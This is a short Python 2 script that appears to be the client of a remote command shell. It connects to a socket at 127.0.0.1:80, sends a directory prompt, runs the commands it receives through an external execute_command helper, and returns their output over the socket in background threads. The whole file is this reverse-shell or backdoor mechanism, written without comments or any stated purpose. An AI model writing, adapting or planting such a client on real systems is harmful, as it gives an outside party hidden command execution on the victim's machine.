import socket
import subprocess
import Queue
import os
import threading
import time
import shell_defines

marker = chr(255)

comm_socket = socket.socket()
comm_socket.connect(("127.0.0.1",80))
comm_socket.sendall("\n"+os.getcwd()+">"+marker)

output_queue = Queue.Queue()

class MessageHandler:
	def __init__(self, data_prefix):
		self.data_prefix = data_prefix
		self.input_queue = Queue.Queue()
		
	def put(self, data):
		self.input_queue.put(data)
		
	def send(self, data):
		output_queue.put(self.data_prefix+data+marker)
		
	def run(self):
		pass
		
class UserInputHandler(MessageHandler):

	def run(self):
		while True:
			print "trying to get data!"
			data = self.input_queue.get()
			
			if data.startswith("test"):
				output = shell_defines.test(data)
			else:
				output = shell_defines.execute_command(data)
			self.send(output)
		
handlers = []
user_input_handler = UserInputHandler(chr(1))
handlers.append(user_input_handler)

t = threading.Thread(target=user_input_handler.run)
t.daemon = True
t.start()

def data_sender():
	while True:
		comm_socket.sendall(output_queue.get())
				
t = threading.Thread(target=data_sender)
t.daemon = True
t.start()

while True:
	data = comm_socket.recv(4096)[:-1]
	if not data: break
	print "GOT DATA!!"
	
	if data.startswith(chr(1)):
		print "FOR USER INPUT!!"
		user_input_handler.put(data[1:])
		
	elif data.startswith(chr(9)):
		pass